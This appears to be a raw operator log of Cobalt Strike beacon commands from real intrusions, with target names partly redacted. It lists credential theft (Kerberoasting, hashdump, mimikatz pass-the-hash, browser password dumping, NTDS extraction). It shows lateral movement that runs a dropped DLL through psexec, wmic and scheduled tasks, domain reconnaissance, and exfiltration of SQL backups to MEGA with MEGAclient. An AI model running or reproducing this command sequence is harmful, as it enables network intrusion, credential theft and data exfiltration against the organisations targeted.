+beacon> execute-assembly /home/user/Desktop/cobalt/Tools/Ghostpack-CompiledBinaries-master/Rubeus.exe kerberoast /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\Users\raja-9298\EULA_ha.txt
+beacon> portscan 10.59.8.0/24 23,22,80,1433,135,445,3389,5900`
+beacon> shell net group "domain admins" /dom
+beacon> portscan 192.168.237.0/24 23,22,80,1433,135,445,3389,5900`
+beacon> portscan 172.21.182.0/24`
+beacon> execute-assembly /home/user/tools/Net-GPPPassword.exe
+beacon> shell net group "domain admins" /dom
+beacon> shell net group "enterprise admins" /dom
+beacon> shell net localgroup "Administrators"
+beacon> shell nslookup
+beacon> shell net user ES050616C /dom
+beacon> shell net user ES050616C /dom
+beacon> net share
+beacon> net logons
+beacon> net domain
+beacon> net domain_controllers
+beacon> shell net use
+beacon> shell WMIC /Node:192.168.4.28 /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
+beacon> shell WMIC /Node:192.168.1.235 /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
+beacon> runas /user:REDACTED.com\Shutdown REDACTED "cmd /c rundll32 C:\Windows\temp\vmware-temp\AgentNT.dll entryPoint"
+beacon> shell WMIC /Node:192.168.6.34 /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
+beacon> shell WMIC /Node:192.168.0.107 /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
+beacon> shell WMIC /Node:10.10.10.56 /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
+beacon> shell wmic /node:Metafile-vm1.REDACTED.com process call create "netstat.exe -abno > C:\Windows\Temp\output.txt"
+beacon> shell wmic /node:10.10.10.56 process call create "netstat.exe -abno > C:\Windows\Temp\output.txt"
+beacon> shell rundll32 C:\Windows\temp\vmware-temp\AgentNT.dll entryPoint
+beacon> shell schtasks /create /ru REDACTED.com\Omiller /tn ManagementAgentNTT /tr "rundll32 C:\Windows\temp\vmware-temp\AgentNT.dll entryPoint" /sc ONCE  /sd 10/04/2021 /ST 01:00 /f
+beacon> shell schtasks /run /tn ManagementAgentNTT
+beacon> make_token
+beacon> shell schtasks /create /s SCANSTORAGE /u REDACTED.com\Shutdown /p REDACTED /tn ManagementAgentNTT /tr "rundll32 C:\Windows\temp\vmware-temp\AgentNT.dll entryPoint" /sc minute
+beacon> spawnas REDACTED.com\Shutdown REDACTED 3333
+beacon> spawnas REDACTED.com\EDIADMIN REDACTED https
+beacon> portscan 192.168.3.0/24 445 icmp 1024
+beacon> shell ping PDFStorage.REDACTED.com
+beacon> sleep 3
+beacon> shell ping TLCSophos.REDACTED.com
+beacon> sleep 3
+beacon> shell ping TLCBENTS02.REDACTED.com
+beacon> shell ping TLCBENTS01.REDACTED.com
+beacon> shell pgo.bat
+beacon> shell pingtimeout.bat
+beacon> sleep 100
+beacon> shell MEGAclient.exe put -q --ignore-quota-warn F:\SQLBackup\*.bak
+beacon> shell MEGAclient.exe put -q --ignore-quota-warn \\wwsql2\F$\SQLBackup\*.bak
+beacon> shell dir F:\SQLBackup
+beacon> run ntdsutil "ac in ntds" "ifm" "cr fu c:\windows\temp\abcd" q q
+beacon> shell tasklist /s 10.225.10.215 /v
+beacon> shell tasklist /s 10.195.23.13 /v
+beacon> shell tasklist /s 10.195.23.14 /v
+beacon> shell nltest /dclist:REDACTED.com
+beacon> shell nltest /dclist:
+beacon> run net use * "\\192.168.168.10\Shares" /persistent:no /user:PKGPROD\jess REDACTED
+beacon> make_token saig.REDACTED.global\adm.soucam1 REDACTED
+beacon> shell tasklist /s 10.195.23.14 /v
+beacon> shell net use X: \\10.195.113.12\C$\temp /user:c360.local\adm.ravven0 REDACTED
+beacon> shell tasklist /s 10.195.13.14 /v /u c360.local\adm.ravven0 /p REDACTED
+beacon> portscan 10.195.13.14 445,139 icmp 1024
+beacon> shell net user adm.ji0lei0 /dom
+beacon> shell dir \\10.195.13.14\c$
+beacon> shell tasklist /s 10.225.10.215 /v
+beacon> elevate svc-exe
+beacon> shell ping -n 1 REDACTED.global
+beacon> shell ping REDACTED.global
+beacon> shell dir \\10.225.10.201\c$
+beacon> shell dir \\datacenter.local\c$
+beacon> jump psexec_psh datacenter.local https
+beacon> jump psexec64 datacenter.local https
+beacon> jump psexec_psh datacenter.local https
+beacon> pth datacenter.local\adm.barsmr0 REDACTED
+beacon> jump psexec_psh datacenter.local https
+beacon> rev2self
+beacon> pth datacenter.local\adm.taydav1  REDACTED
+beacon> jump psexec_psh USHDC1-REDACTED https
+beacon> shell adfind.exe -b dc=c360,dc=local -f "(objectcategory=person)" > C:\Windows\temp\Eula_c360.txt
+beacon> shell net localgroup "administrators"
+beacon> shell net use \\datacenter.local\c$ REDACTED /user:datacenter.local\adm.turime0
+beacon> make_token saig.REDACTED.global\adm.turime0 REDACTED
+beacon> rev2self
+beacon> make_token saig.REDACTED.global\adm.turime0 REDACTED
+beacon> jump psexec_psh USHDC1-REDACTED https
+beacon> net domain_trusts
+beacon> net domain
+beacon> shell nslookup 80-20 80-20.com
+beacon> portscan 80-20 80-20.com 445 icmp 1024
+beacon> shell ping 80-20 80-20.com -n 1
+beacon> shell ping LEADERS leaders.REDACTED.global -n 1
+beacon> portscan 10.225.10.201 445
+beacon> make_token saig.REDACTED.global\Americadpm REDACTED
+beacon> shell copy x64.dll \\10.225.10.201\C$\windows\Temp\
+beacon> psinject 760 x64 Invoke-Kerberoast -outputformat hashcat | fl | out-file -filepath C:\Windows\Temp\Eula.txt -append -force -encoding UTF8
+beacon> make_token saig.REDACTED.global\Americadpm REDACTED
+beacon> shell copy x64.dll \\10.212.8.247\C$\ProgramData
+beacon> shell wmic /node:10.212.8.247 process call create "rundll32 C:\ProgramData\x64.dll entryPoint"
+beacon> shell copy x64.dll \\datacenter.local\C$\windows\Temp\
+beacon> shell copy C:\ProgramData\x64.dll \\datacenter.local\C$\windows\Temp\
+beacon> make_token saig.REDACTED.global\sqladmin REDACTED
+beacon> upload /home/user/Desktop/cobalt/dll_maker/x64.dll
+beacon> shell copy x64.dll \\datacenter.local\C$\windows
+beacon> psinject 440 x64 Invoke-Kerberoast Invoke-Kerberoast -OutputFormat HashCat -Domain legalco.local | fl
+beacon> psinject 440 x64 Invoke-Kerberoast -OutputFormat HashCat -Domain datacenter.local | fl
+beacon> psinject 440 x64 Invoke-Kerberoast -OutputFormat HashCat -Domain datacenter.local | fl
+beacon> shell net user adm.kinzac0 /domain /active:yes
+beacon> shell net user adm.kinzac0 /dom
+beacon> run ping ad-apse2.prd.REDACTED.REDACTED
+beacon> run ping Anstat.local
+beacon> remote-exec psexec 10.10.20.131 C:\starter.exe
+beacon> shell net use
+beacon> portscan 10.0.20.222 3389 none
+beacon> shell c:\explorer.exe
+beacon> shell WINDOWSSystem32.exe
+beacon> pwd
+beacon> whoami
+beacon> shell whoami
+beacon> shell dir 1.exe
+beacon> shell 1.exe
+beacon> shell PsExec \\10.0.20.222 -d -s -h gpupdate /force -accepteula -y -u itc.local\egl_admin -p REDACTED
+beacon> shell PsExec \\* -d -s -h gpupdate /force -accepteula -y -u itc.local\egl_admin -p REDACTED
+beacon> shell net use
+beacon> shell ping REDACTED.com
+beacon> shell ping REDACTED.ger
+beacon> shell dir \\172.22.198.11\C$
+beacon> shell net group administrators
+beacon> shell echo 1 > C:\readme.txt
+beacon> shell dir C:\readme.txt
+beacon> shell type C:\readme.txt
+beacon> upload /home/wevvewe/Desktop/readme.txt
+beacon> shell dir readme.txt
+beacon> pwd
+beacon> upload /home/wevvewe/Desktop/readme.txt
+beacon> shell dir readme.txt
+beacon> ls C:\
+beacon> shell dir C:\readme.txt
+beacon> shell type C:\readme.txt
+beacon> inject 1108 x64 https
+beacon> elevate svc-exe
+beacon> net domain
+beacon> hashdump
+beacon> logonpasswords
+beacon> jobs
+beacon> shell copy x64.dll \\139.62.66.77\C$\ProgramData
+beacon> shell dir
+beacon> ls C:\Users\cmelliott\AppData\Local\Microsoft\Edge
+beacon> audit_uac
+beacon> shell gpupdate
+beacon> shell net group "domain admins" /dom
+beacon> execute-assembly /home/user/Desktop/cobalt/Tools/Net-GPPPassword.exe
+beacon> execute-assembly /home/user/Desktop/cobalt/Tools/Net-GPPPassword.exe
+beacon> execute-assembly SharpView.exe Get-Domain
+beacon> shell net localgroup administrators
+beacon> shell net group "Domain admins" /dom
+beacon> shell net group "Enterprise admins" /dom
+beacon> shell nslookup REDACTED.com
+beacon> shell arp -a
+beacon> shell type setting.ini
+beacon> shell route print -4
+beacon> shell net share
+beacon> shell reg query HKCU\Environment
+beacon> net domain
+beacon> execute-assembly /home/user/tools/ShWeb/SharpWeb.exe all
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/SharpWeb.exe all
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/SharpChrome.exe logins /showall
+beacon> spawn vew
+beacon> shell net group "Domain Admins" /dom
+beacon> net domain
+beacon> shell ping -n 1 asdasdasdsa.sadasdsadsa.REDACTED.com
+beacon> shell ping -n 1 REDACTED.com
+beacon> shell ping -n 1 www.REDACTED.com
+beacon> shell net user nddevbernst /dom
+beacon> execute-assembly /home/omar/Desktop/Fast-Guide/Net-GPPPassword.exe
+beacon> exit
+beacon> pth REDACTED.COM\aandaservice REDACTED
+beacon> shell copy x64.dll \\192.168.100.227\C$\ProgramData\x64.dll
+beacon> pth REDACTED\aandaservice REDACTED
+beacon> execute-assembly /home/user/TOOLS/2/SharpShares.exe shares
+beacon> portscan 172.0.0.1/24 21,22,23,25,53,80,81,110,119,137,139,143,443,445,465,587,993,995,1080,1194,1433,3306,3389,5500,5800,5900-5906,8080,9001,9030,9050,9051,9090,9091,9100 icmp 1024
+beacon> portscan 172.0.0.1/24 445 icmp 1024
+beacon> shell nltest /dclist:
+beacon> shell net accounts
+beacon> net domain
+beacon> net domain_controllers
+beacon> shell nltest /dclist:REDACTED.com
+beacon> shell net accounts /dom
+beacon> psinject 4540 x64 Invoke-ShareFinder
+beacon> portscan 10.69.0.35 445 none
+beacon> spawn https
+beacon> net domain
+beacon> ls \\admindc1\c$
+beacon> ls \\admindc2\c$
+beacon> ls \\admindc3\c$
+beacon> ls \\admindc4\c$
+beacon> ls \\admindc5\c$
+beacon> ls \\dhcp02\c$
+beacon> ls \\kms\c$
+beacon> ls \\hyperv24\c$
+beacon> spawn u7
+beacon> spawn u7
+beacon> spawn https
+beacon> psinject 13584 x86 Get-DomainUser -Server 10.50.212.45 | out-file -filepath "C:\ProgramData\ad_users.txt"
+beacon> run AdFind.bat
+beacon> shell AdFind.bat
+beacon> shell dir
+beacon> net domain
+beacon> help rportfwd
+beacon> shell net use \\FAMIXXP\c$ rbuilder /user:REDACTED.com\REPORT_BUILDER
+beacon> shell net use
+beacon> shell nltest /dclist:REDACTED.com
+beacon> shell nltest /dclist:
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe Angel Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe bbuerck Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe canceleta Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe DHaase Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe orgbarracuda Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe Uptime Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe adonixadmin Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe barracuda Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe BGW Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe cevansa Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe EntAdmin Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe sagert Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe veeam Administrator REDACTED
+beacon> 
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe alloyamms Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe BarracudaBUP Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe CAncelet Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe citrix_svc Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe gahbarracuda Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe Services_Backup Administrator REDACTED
+beacon> 
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe wstangea Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe Administrator Administrator REDACTED
+beacon> shell sqlcmd -S 10.89.11.15,1433 -E -Q "BACKUP DATABASE 'Remote Desktop Services' TO DISK='D:\temporary\Remote Desktop Services.bak'"
+beacon> shell sqlcmd -S 10.89.0.99,1433 -E -Q "BACKUP DATABASE KLCAuditReporting TO DISK='D:\temporary\KLCAuditReporting.bak'"
+beacon> shell sqlcmd -S 89.0.0.121,1433 -E -Q "use InsightEnt; exec sp_tables" -W
+beacon> shell sqlcmd -S 89.0.0.121,1433 -E -Q "use Intermec; exec sp_tables" -W
+beacon> shell sqlcmd -S 89.0.0.121,1433 -E -Q "use SmartSystems; exec sp_tables" -W
+beacon> shell sqlcmd -S 89.0.0.121,1433 -E -Q "use WimanDB; exec sp_tables" -W
+beacon> shell sqlcmd -S 89.0.0.121,1433 -E -Q "use Workforce; exec sp_tables" -W
+beacon> shell sqlcmd -S 10.89.11.118,1433 -E -Q "SELECT name FROM master.dbo.sysdatabases;"
+beacon> shell sqlcmd -S 10.89.0.52,1433 -E -Q "SELECT name FROM master.dbo.sysdatabases;"
+beacon> shell sqlcmd -S 89.0.0.121,1433 -E -Q "SELECT name FROM master.dbo.sysdatabases;"
+beacon> shell sqlcmd -S 10.1.1.243,49289 -E -Q "SELECT name FROM master.dbo.sysdatabases;"
+beacon> shell sqlcmd -S 10.89.0.99,1433 -E -Q "SELECT name FROM master.dbo.sysdatabases;"
+beacon> shell sqlcmd -S 10.89.11.15,1433 -E -Q "SELECT name FROM master.dbo.sysdatabases;"
+beacon> shell sqlcmd -S localhost -E -Q "SELECT name FROM master.dbo.sysdatabases;"
+beacon> shell sqlcmd -S localhost -E -Q "SELECT name FROM master.dbo.sysdatabases;"
+beacon> portscan 10.69.0.35 445 none
+beacon> shell dir \\dcwas79.REDACTED.com\D$
+beacon> shell dir \\dcveeam01.REDACTED.com\F$
+beacon> shell dir \\bod01-bkp01.eu.REDACTED.com\F$
+beacon> shell dir \\BBDC03.REDACTED.co.uk\C$
+beacon> shell dir \\192.168.3.8\C$\readme.txt
+beacon> shell dir \\192.168.3.7\C$\readme.txt
+beacon> jump psexec 170.7.5.10 smb
+beacon> jump psexec 170.7.41.214 smb
+beacon> shell ping HQTAS37
+beacon> shell ping HQTAS65
+beacon> shell dir \\BBDC03.REDACTED.co.uk\vCenterBackups
+beacon> shell dir \\BBDC03.REDACTED.co.uk\SQL_Server
+beacon> shell dir \\BBDC03.REDACTED.co.uk\SQL_Server\App
+beacon> shell dir \\BBDC03.REDACTED.co.uk\SQL_Server\Sys
+beacon> shell net view \\10.0.6.56
+beacon> shell net use
+beacon> shell dir N:
+beacon> shell type C:\readme.txt
+beacon> portscan 10.30.17.24 445 none
+beacon> shell ipconfig /all
+beacon> shell reg query HKCU\Environment
+beacon> net domain
+beacon> shell whoami
+beacon> shell net accounts /dom
+beacon> shell net user panderson /dom
+beacon> shell osql.exe -U sa
+beacon> portscan 10.10.1.41 61340
+beacon> portscan 10.10.1.41
+beacon> portscan 10.7.18.36
+beacon> portscan 10.7.19.25 1433
+beacon> hashdump
+beacon> net domain
+beacon> net domain
+beacon> net domain_controllers
+beacon> shell net localgroup Administrators
+beacon> shell net group "Domain Admins" /dom
+beacon> shell net group "Enterprise Admins" /dom
+beacon> shell dir \\10.7.6.127\C$
+beacon> shell type \\10.7.6.127\C$\SA.txt
+beacon> execute-assembly /home/user/Desktop/SharpTools/Sharp-SMBExec.exe hash:REDACTED username:DC$ domain:. target:DC.testlab.local command:rundll32 C:\x64.dll entryPoint -debug
+beacon> net domain
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/SharpSniper.exe superlogin
+beacon> shell type C:\MultiLink\README.txt
+beacon> portscan 10.1.10.0/16 445 icmp 1024
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/SharpWeb.exe all
+beacon> psinject 1636 x64 Invoke-ShareFinder -Domain Northerntrust.local | Out-File sharfindINFO.txt
+beacon> psinject 1636 x64 Invoke-ShareFinder | Out-File sharfindINFO.txt
+beacon> net domain
+beacon> shell dir \\89.0.10.104\Videos
+beacon> net domain
+beacon> help mv
+beacon> help cp
+beacon> net domain
+beacon> execute-assembly /home/user/tools/ShWeb/SharpWeb.exe all
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/SharpWeb.exe all
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/SharpChrome.exe logins /showall
+beacon> shell net user GPJHelp
+beacon> shell dir \\192.168.120.28\C$
+beacon> shell dir \\10.200.100.42\C$
+beacon> shell dir \\192.168.140.3\C$
+beacon> shell dir \\192.168.221.42\C$
+beacon> shell dir \\192.168.120.28\C$
+beacon> shell net group "Domain Admins" /dom
+beacon> download C:\ProgramData\trustdmp_17.txt
+beacon> hashdump
+beacon> shell net localgroup Administrators
+beacon> execute-assembly Rubeus.exe brute /users:C:\ProgramData\user.txt /password:C:\ProgramData\pass.txt /dc:REDACTED
+beacon> mimikatz sekurlsa::pth /user:Linux /domain:PKGPROD /ntlm:REDACTED /run "net use * "\\192.168.168.10\C$" /persistent:no"
+beacon> shell net use * "\\192.168.168.10\C$" /persistent:no /user:PKGPROD\Linux REDACTED
+beacon> shell net use G: \\192.168.168.15\C$\temp /user:PKGPROD\Linux REDACTED
+beacon> shell net use G: \\192.168.168.66\C$\temp /user:PKGPROD\Linux REDACTED
+beacon> shell net use G: \\192.168.168.66\C$\temp /user:PKGPROD\jess REDACTED
+beacon> shell net use G: \\192.168.168.66\C$\temp /user:PKGPROD\jess REDACTED
+beacon> shell net user Linux /dom
+beacon> remote-exec psexec 10.102.71.35 rundll32 C:\Windows\Temp\x64.dll entryPoint
+beacon> shell wmic /node:78186W7P os get osarchitecture`
+beacon> shell rundll32 C:\Windows\system32\mrtsvc.dll entryPoint
+beacon> shell schtasks /query
+beacon> spawn vew
+beacon> hashdump
+beacon> logonpasswords
+beacon> shell copy x64.dll \\139.62.166.164\C$\ProgramData
+beacon> shell wmic /NODE:139.62.166.164 process call create "rundll32 C:\ProgramData\x64.dll entryPoint"
+beacon> shell dir \\139.62.166.164\C$\ProgramData\x64.dll
+beacon> psinject 15344 x64 Invoke-Kerberoast -domain itstest.ad | fl
+beacon> net domain
+beacon> shell ping PHONEBILLING.REDACTED.REDACTED.edu
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/Rubeus.exe kerberoast /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\ProgramData\hashes.txt
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/Rubeus.exe asreproast /format:hashcat /outfile:C:\ProgramData\asrephashes.txt
+beacon> net domain_trusts
+beacon> net domain_controllers
+beacon> net domain
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/Ghostpack-CompiledBinaries-master/Rubeus.exe asreproast /domain:ru.REDACTED.com
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/Ghostpack-CompiledBinaries-master/Rubeus.exe asreproast /domain:tsi.REDACTED.com
+beacon> execute-assembly Rubeus.exe kerberoast /domain:ru.REDACTED.com
+beacon> psinject 24992 x86 invoke-kerberoast -domain ru.REDACTED.com | fl
+beacon> powerpick invoke-kerberoast | fl
+beacon> psinject 24992 x86 invoke-kerberoast | fl
+beacon> powerpick Invoke-InveighRelay -ConsoleOutput Y -StatusOutput N -Target 172.20.3.7 -Command "tasklist" -Attack Enumerate,Execute,Session
+beacon> shell net group "Domain Admins" /dom
+beacon> net domain
+beacon> portscan 3.15.36.195 80,443 icmp 2
+beacon> shell ping signon.jdisonline.com
+beacon> portscan 3.15.36.195 445,139 icmp 2
+beacon> shell wmic /NODE:172.31.190.103  /privileges:enable  OS GET Name,OSArchitecture
+beacon> shell ping LRH-NESSUS01.REDACTED.local
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/SharpWeb.exe all
+beacon> logonpasswords
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/SafetyKatz.exe
+beacon> shell ping Scott.REDACTED.local
+beacon> portscan 172.31.190.47 80,443,25,110,995,143,993,465 icmp 10
+beacon> net dclist
+beacon> shell nltest /dclist:REDACTED
+beacon> shell nltest /dclist:REDACTED.loc
+beacon> net domain_controllers
+beacon> shell dir "C:\Users\Djarden\AppData\Local\Microsoft\Edge\User Data\Default\History"
+beacon> shell dir "C:\Users\Djarden\AppData\Local\Microsoft\Edge\User Data\Default\"
+beacon> shell dir "C:\Users\Djarden\AppData\Local\Microsoft\Edge\User Data\"
+beacon> shell dir "C:\Users\Djarden\AppData\Local\Microsoft\Edge\"
+beacon> shell ping -n 1 asdasdasdsa.sadasdsadsa.REDACTED.com
+beacon> shell ping -n 1 REDACTED.com
+beacon> shell ping -n 1 www.REDACTED.com
+Binary file (standard input) matches
+beacon> shell net user nddevbernst /dom
+beacon> portscan 192.168.0.119 1-10000 icmp 1024
+beacon> hashdump
+beacon> shell dir \\89.0.192.165\C$
+beacon> shell ping -n 1 sa.REDACTED.com
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/SharpSniper.exe NathanK ITC\br_admin REDACTED
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/SharpSniper.exe NathanK
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/SharpSniper.exe egl_admin ITC\br_admin REDACTED
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/SharpSniper.exe egl_admin ITC\egl_admin REDACTED
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/SharpSniper.exe johnnyp ITC\br_admin REDACTED
+beacon> pth ITC\br_admin REDACTED
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/SharpSniper.exe egl_admin
+beacon> shell dnscmd us.REDACTED.com /info
+beacon> shell dnscmd REDACTED.us.REDACTED.com /info
+beacon> portscan 89.0.10.104 1-10000 icmp 200
+beacon> shell copy places.sqlite places.sqlite.back
+beacon> download C:\Users\mharper\AppData\Roaming\Mozilla\Firefox\Profiles\krbjz40r.default-1588080079106\places.sqlite
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/SharpWeb.exe all
+beacon> rev2self
+beacon> make_token .\administrator REDACTED
+beacon> jump psexec_psh AWS-VDDC01 https
+beacon> shell net group "domain admins" /dom && net group "enterprise admins" /dom && net localgroup administrators
+beacon> net domain_controllers
+beacon> net domain
+beacon> net view \\HK-VPDC01 /all
+beacon> net view \\AWS-VDDC01 /all
+beacon> psinject 7256 x64 Invoke-ShareFinder
+beacon> net view \\hostname /all
+beacon> hashdump
+beacon> run rundll32 c:\Users\abinash.pattnayak\AppData\Local\Microsoft\XboxLive\AuthStateCache.dll entryPoint
+beacon> shell tasklist /s 10.225.10.53 /v
+beacon> shell ping USHDC1-REDACTED.datacenter.local
+beacon> shell ping USHDC1-REDACTED.datacenter.local
+beacon> shell tasklist /s 10.225.10.202 /v
+beacon> pth datacenter.local\Administrator REDACTED
+beacon> shell wmic /node:10.225.10.201 process call create "cmd /c ping stormname.com > C:\ProgramData\p.txt"
+beacon> shell type \\10.225.10.201\C$\ProgramData\p.txt
+beacon> rm \\10.225.10.201\C$\ProgramData\p.txt
+beacon> upload /home/user/Desktop/cobalt/dll_maker/x64.dll
+beacon> shell copy x64.dll \\10.225.10.201\C$\ProgramData\
+beacon> shell wmic /node:10.225.10.201 process call create "rundll32 C:\ProgramData\x64.dll entryPoint"
+beacon> shell dir \\10.225.10.201\C$\ProgramData\x64.dll
+beacon> shell type \\10.225.10.201\C$\ProgramData\sq.txt
+beacon> shell ping REDACTED.com
+beacon> pth datacenter.local\Administrator REDACTED
+beacon> shell dir \\10.225.10.201\C$\ProgramData\
+beacon> shell wmic /node:10.225.10.201 process call create "cmd /c ping google.com > C:\ProgramData\p.txt"
+beacon> shell type \\10.225.10.201\C$\ProgramData\p.txt
+beacon> rm \\10.225.10.201\C$\ProgramData\p.txt
+beacon> shell dir
+beacon> shell copy x64.dll \\10.225.10.201\C$\ProgramData\
+beacon> shell wmic /node:10.225.10.201 process call create "rundll32 C:\ProgramData\x64.dll entryPoint"
+beacon> shell dir \\10.225.10.201\C$\ProgramData\x64.dll
+beacon> shell type \\10.195.100.1\C$\ProgramData\p.txt
+beacon> shell wmic /node:10.195.100.1 process call create "cmd /c ping google.com > C:\ProgramData\p.txt"
+beacon> shell dir \\10.195.100.1\C$\ProgramData\p.txt
+beacon> pth SaigProd.local\svc.sccmcliinst REDACTED
+beacon> ls \\10.195.100.1\C$\ProgramData
+beacon> pwd
+beacon> cd C:\ProgramData
+beacon> upload /home/user/Desktop/cobalt/dll_maker/x64.dll
+beacon> shell copy x64.dll \\10.195.100.1\C$\ProgramData
+beacon> shell dir \\10.195.100.1\C$\ProgramData
+beacon> shell dir \\10.195.100.1\C$\ProgramData\x64.dll
+beacon> shell wmic /node:10.195.100.1 process call create "rundll32 C:\ProgramData\x64.dll entryPoint"
+beacon> shell dir \\10.195.100.1\C$\ProgramData\x64.dll
+beacon> shell wmic /node:169.254.195.31 process call create "ping google.com>C:\ProgramData\SOOQA.txt"
+beacon> shell wmic /node:169.254.195.31 process call create "ping google.com>C:\Windows\Temp\SOOQA.txt"
+beacon> shell wmic /node:169.254.195.31 process call create "ping google.com>C:\Windows\Temp\SOOQA.txt"
+beacon> shell dir
+beacon> shell ping google.com > C:\ProgramData\output.txt
+beacon> cd C:\ProgramData
+beacon> shell dir
+beacon> shell wmic /node:10.225.10.200 process call create "ping google.com>C:\Windows\Temp\output.txt"
+beacon> shell wmic /node:10.225.10.200 process call create "rundll32 C:\Windows\Temp\x64.dll entryPoint"
+beacon> shell wmic /node:172.31.190.100 /user:JDOSSN\nddevbernst /password:REDACTED OS GET Name
+beacon> shell net use * \\172.31.190.100\C$ /user:JDOSSN\nddevbernst REDACTED
+beacon> shell net use \\172.31.190.101\C$\
+beacon> net share \\172.31.190.101
+beacon> shell dir \\172.31.190.100\C$\ProgramData
+beacon> shell dir \\172.31.190.101\C$\ProgramData
+beacon> shell dir \\172.31.190.102\C$\ProgramData
+beacon> shell net group "domain admins" /dom
+beacon> shell dir \\172.31.190.100\c$
+beacon> execute-assembly /home/omar/Desktop/Fast-Guide/Net-GPPPassword.exe
+beacon> shell systeminfo
+beacon> shell net view \\10.16.239.134\
+beacon> shell net use * \\10.0.53.26\dump
+beacon> shell net use * \\10.0.53.26\engrade
+beacon> shell net view \\10.0.53.26\
+beacon> shell net view \\10.0.53.26\
+beacon> shell net view \\10.0.50.1\
+beacon> shell net view \\10.0.53.25\
+beacon> shell net view \\10.51.200.121\
+beacon> shell net view \\10.0.61.61\
+beacon> shell net view \\10.0.61.57\
+beacon> shell net view \\10.0.53.230\
+beacon> shell net view \\10.116.200.121\
+beacon> shell net view \\10.58.200.121\
+beacon> shell net view \\10.0.53.25\
+beacon> shell net view \\10.0.50.1\
+beacon> shell net view \\10.0.53.26\
+beacon> shell net view \\10.51.200.121\
+beacon> shell net view \\10.0.61.61\
+beacon> shell dir \\10.0.61.61\E$
+beacon> shell net use * \\10.0.61.61\C$
+beacon> portscan 10.0.61.69 445,135,139
+beacon> shell net view \\10.0.61.69 /all
+beacon> shell wmic /node:10.0.61.69 os get name
+beacon> shell wmic /node:10.0.61.69 logicaldisk get description,name
+beacon> shell net use * \\10.0.61.69\C$
+beacon> shell net use \\10.100.7.16\c$ REDACTED /user:Administrator
+beacon> shell net use \\10.100.7.16\c$ consolidate_16 /user:Administrator
+beacon> shell ping -n 1 REDACTED.com
+beacon> shell ipconfig /all
+beacon> shell dnscmd /enumzones > AllZones.txt
+beacon> shell dir C:\windows\system32\dns
+beacon> shell ping -n 1 SYD-WSUS-01
+beacon> shell ping -n 1 DEN-SCCM-01
+beacon> shell ping -n 1 DEN-WSUS-01
+beacon> mimikatz kerberos::list
+beacon> exit
+beacon> shell wmic nic get name, index
+beacon> shell wmic path win32_networkadapter where index=4 call enable
+beacon> shell wmic path win32_networkadapter where index=5 call enable
+beacon> shell wmic /node:10.28.92.159 OS GET Name
+beacon> shell dir \\10.28.92.159\ADMIN$
+beacon> shell net localgroup "administrators"
